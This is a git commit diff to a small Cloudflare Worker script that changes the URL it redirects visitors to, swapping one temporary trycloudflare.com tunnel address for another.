68cee3ee9cbdee82a020ed15b2a299cdac5bdd63
Daniel Chima Okeke <danielokeke602@gmail.com>
2026-02-09 00:17:17 +0100

    Update target URL for redirect in fetch function

--- index.js
+++ index.js
@@ -1,7 +1,7 @@
 export default {
   async fetch(request) {
     // Paste your link from Phase 1 here
-    const target = "https://roughly-compare-methodology-fuel.trycloudflare.com";
+    const target = " https://settlement-range-investigated-filled.trycloudflare.com ";
     return Response.redirect(target, 301);
   }
 }
